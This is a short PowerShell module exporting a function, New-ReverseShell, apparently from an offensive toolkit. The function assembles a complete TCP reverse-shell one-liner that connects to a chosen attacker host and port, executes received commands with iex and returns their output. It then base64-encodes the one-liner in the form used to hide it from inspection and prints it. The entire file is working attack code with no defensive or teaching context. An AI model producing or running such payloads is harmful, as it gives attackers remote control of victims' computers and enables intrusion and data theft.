function New-ReverseShell {
	param ([string] $lhost, [int] $lport=4444)
	# Adapted from https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
	$shellString = '$c=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$t=(iex ". { $d } 2>&1"|Out-String);$t+="$pwd> ";$s.Write([text.encoding]::ASCII.GetBytes($t),0,$t.Length);$s.Flush()};$c.Close()';
	$bytes = [System.Text.Encoding]::Unicode.GetBytes($shellString);
	$b64 = [Convert]::ToBase64String($bytes)
	Write-Host $b64
}

Export-ModuleMember -Function New-ReverseShell
